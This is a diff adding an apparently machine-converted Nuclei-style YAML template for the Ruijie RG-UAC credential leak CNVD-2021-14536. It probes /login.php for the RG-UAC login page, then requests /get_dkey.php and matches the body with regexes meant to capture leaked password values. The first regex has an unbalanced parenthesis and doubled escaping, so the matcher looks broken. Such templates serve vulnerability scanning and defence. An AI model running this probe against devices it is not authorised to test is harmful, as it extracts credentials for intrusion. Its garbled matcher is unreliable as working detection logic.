@@ -1,0 +1,37 @@
+id: yaml-poc-ruijie-rg_uac-leak-CNVD-2021-14536
+info:
+  name: Yaml Poc Ruijie Rg_Uac Leak Cnvd 2021 14536
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-ruijie-rg_uac-leak-CNVD-2021-14536'
+  tags: xpoc
+  reference: []
+http:
+- method: GET
+  path:
+  - /login.php
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - <title>RG-UAC登录页面</title>
+    - get_dkey_passwd
+- method: GET
+  path:
+  - /get_dkey.php
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: regex
+    part: body
+    regex:
+    - )\\s*:\\s*(.*),?
+    - ^\\[(.*)\\]$
